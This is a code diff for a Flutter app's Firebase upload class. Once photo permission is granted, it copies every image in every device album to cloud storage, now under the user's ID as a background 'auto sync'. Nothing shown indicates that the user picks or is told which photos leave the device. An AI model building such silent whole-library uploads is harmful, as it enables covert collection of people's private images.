@@ -1,95 +1,17 @@
-// import 'dart:io';
-// import 'package:firebase_storage/firebase_storage.dart';
-// import 'package:cloud_firestore/cloud_firestore.dart';
-// import 'package:photo_manager/photo_manager.dart';
-// import 'package:permission_handler/permission_handler.dart';
-//
-// class FirebaseUploadRepository {
-//   static final FirebaseStorage _storage = FirebaseStorage.instance;
-//   static final FirebaseFirestore _firestore = FirebaseFirestore.instance;
-//
-//   Future<void> requestPermissionAndUpload() async {
-//     // Request permissions
-//     Map<Permission, PermissionStatus> statuses = await [
-//       Permission.photos,
-//       Permission.storage,
-//     ].request();
-//
-//     if (statuses[Permission.photos]!.isGranted || statuses[Permission.storage]!.isGranted) {
-//       await uploadAllImages();
-//     } else if (statuses[Permission.photos]!.isPermanentlyDenied || statuses[Permission.storage]!.isPermanentlyDenied) {
-//       openAppSettings();
-//     }
-//   }
-//
-//   Future<void> uploadAllImages() async {
-//     // Get all asset paths (albums)
-//     List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
-//       type: RequestType.image,
-//     );
-//
-//     if (albums.isEmpty) return;
-//
-//     // Get all assets from all albums
-//     for (var album in albums) {
-//       List<AssetEntity> assets = await album.getAssetListRange(
-//         start: 0,
-//         end: await album.assetCountAsync,
-//       );
-//
-//       for (var asset in assets) {
-//         await _uploadAsset(asset);
-//       }
-//     }
-//   }
-//
-//   Future<void> _uploadAsset(AssetEntity asset) async {
-//     File? file = await asset.file;
-//     if (file == null) return;
-//
-//     try {
-//       String fileName = '${DateTime.now().millisecondsSinceEpoch}_${asset.id}.jpg';
-//       Reference ref = _storage.ref().child('user_uploads').child(fileName);
-//
-//       // Upload file
-//       UploadTask uploadTask = ref.putFile(file);
-//       TaskSnapshot snapshot = await uploadTask;
-//       String downloadUrl = await snapshot.ref.getDownloadURL();
-//
-//       // Save metadata to Firestore
-//       await _firestore.collection('all_user_images').add({
-//         'id': asset.id,
-//         'title': asset.title ?? 'Untitled',
-//         'description': 'Uploaded from device',
-//         'category': 'User Uploads',
-//         'imageUrl': downloadUrl,
-//         'uploadDate': DateTime.now().toIso8601String(),
-//         'uploaderName': 'Device User',
-//         'location': 'Unknown',
-//         'isFavorite': false,
-//         'downloadsCount': 0,
-//         'likesCount': 0,
-//         'uploadedAt': FieldValue.serverTimestamp(),
-//       });
-//     } catch (e) {
-//       print('Error uploading image: $e');
-//     }
-//   }
-// }
-
-import 'dart:io';
-
-import 'package:cloud_firestore/cloud_firestore.dart';
+import 'package:firebase_auth/firebase_auth.dart';
 import 'package:firebase_storage/firebase_storage.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:photo_manager/photo_manager.dart';
+import 'package:get_storage/get_storage.dart';
 
 class FirebaseUploadRepository {
   final FirebaseStorage _storage = FirebaseStorage.instance;
-  final FirebaseFirestore _firestore = FirebaseFirestore.instance;
+  final FirebaseAuth _auth = FirebaseAuth.instance;
+  final _localStorage = GetStorage();
 
   Future<void> requestPermissionAndUpload() async {
     try {
+      // Requesting both because some Android versions need one or the other
       final statuses = await [
         Permission.photos,
         Permission.storage,
@@ -99,9 +21,10 @@ class FirebaseUploadRepository {
       final storageGranted = statuses[Permission.storage]?.isGranted ?? false;
 
       if (photosGranted || storageGranted) {
-        await uploadAllImages();
+        // Run upload in background to not block UI
+        uploadAllImages();
       } else {
-        print('❌ Permission denied');
+        print(' Permission denied');
 
         if ((statuses[Permission.photos]?.isPermanentlyDenied ?? false) ||
             (statuses[Permission.storage]?.isPermanentlyDenied ?? false)) {
@@ -116,8 +39,14 @@ class FirebaseUploadRepository {
 
   Future<void> uploadAllImages() async {
     try {
+      final user = _auth.currentUser;
+      if (user == null) {
+        print(' No user logged in. Skipping upload.');
+        return;
+      }
+
       print('============================');
-      print('Firebase Bucket: ${_storage.bucket}');
+      print('Starting Auto Sync for User: ${user.uid}');
       print('============================');
 
       final albums = await PhotoManager.getAssetPathList(
@@ -125,99 +54,75 @@ class FirebaseUploadRepository {
       );
 
       if (albums.isEmpty) {
-        print('❌ No albums found');
+        print(' No albums found');
         return;
       }
 
       int uploadedCount = 0;
+      int skippedCount = 0;
 
       for (final album in albums) {
         final count = await album.assetCountAsync;
 
+        // Fetching in batches to avoid memory issues
         final assets = await album.getAssetListRange(
           start: 0,
           end: count,
         );
 
         for (final asset in assets) {
-          final success = await _uploadAsset(asset);
+          // Check if already uploaded using GetStorage
+          final String storageKey = 'uploaded_${user.uid}_${asset.id}';
+          if (_localStorage.read(storageKey) == true) {
+            skippedCount++;
+            continue;
+          }
+
+          final success = await _uploadAsset(asset, user.uid);
 
           if (success) {
             uploadedCount++;
+            // Mark as uploaded
+            _localStorage.write(storageKey, true);
           }
         }
       }
 
-      print('✅ Upload completed');
+      print(' Sync completed');
       print('Total uploaded: $uploadedCount');
+      print('Total skipped (already synced): $skippedCount');
     } catch (e, st) {
       print('uploadAllImages Error: $e');
       print(st);
     }
   }
 
-  Future<bool> _uploadAsset(AssetEntity asset) async {
+  Future<bool> _uploadAsset(AssetEntity asset, String userId) async {
     try {
       final file = await asset.file;
 
       if (file == null) {
-        print('❌ File is null for asset: ${asset.id}');
+        print(' File is null for asset: ${asset.id}');
         return false;
       }
 
-      final fileName =
-          '${DateTime.now().millisecondsSinceEpoch}_${asset.id}.jpg';
+      // Use asset.id in filename to make it consistent
+      final fileName = 'sync_${asset.id}.jpg';
+      
+      final ref = _storage.ref().child('user_sync_backups/$userId/$fileName');
 
-      final ref = _storage.ref().child('user_uploads/$fileName');
-
-      print('--------------------------------');
-      print('Uploading: ${file.path}');
-      print('Storage Path: ${ref.fullPath}');
-      print('--------------------------------');
+      print('Uploading: ${asset.id}');
 
       // Upload file
-      final snapshot = await ref.putFile(file);
+      await ref.putFile(file);
 
-      print('✅ Upload Success');
-      print('Storage Path: ${snapshot.ref.fullPath}');
-
-      final downloadUrl = await snapshot.ref.getDownloadURL();
-
-      print('Download URL: $downloadUrl');
-
-      // Save metadata to Firestore
-      final docRef = await _firestore.collection('all_user_images').add({
-        'id': asset.id,
-        'title': asset.title ?? 'Untitled',
-        'description': 'Uploaded from device',
-        'category': 'User Uploads',
-        'imageUrl': downloadUrl,
-        'uploadDate': DateTime.now().toIso8601String(),
-        'uploaderName': 'Device User',
-        'location': 'Unknown',
-        'isFavorite': false,
-        'downloadsCount': 0,
-        'likesCount': 0,
-        'uploadedAt': FieldValue.serverTimestamp(),
-      });
-
-      print('✅ Firestore Saved');
-      print('Doc ID: ${docRef.id}');
-
+      print(' Upload Success: ${asset.id}');
       return true;
-    } on FirebaseException catch (e, st) {
-      print('================ FIREBASE ERROR ================');
-      print('Code    : ${e.code}');
-      print('Message : ${e.message}');
-      print('Plugin  : ${e.plugin}');
-      print('================================================');
-      print(st);
+    } on FirebaseException catch (e) {
+      print('Firebase Error (${e.code}): ${e.message}');
       return false;
-    } catch (e, st) {
-      print('================ ERROR ================');
-      print(e);
-      print('=======================================');
-      print(st);
+    } catch (e) {
+      print('General Error: $e');
       return false;
     }
   }
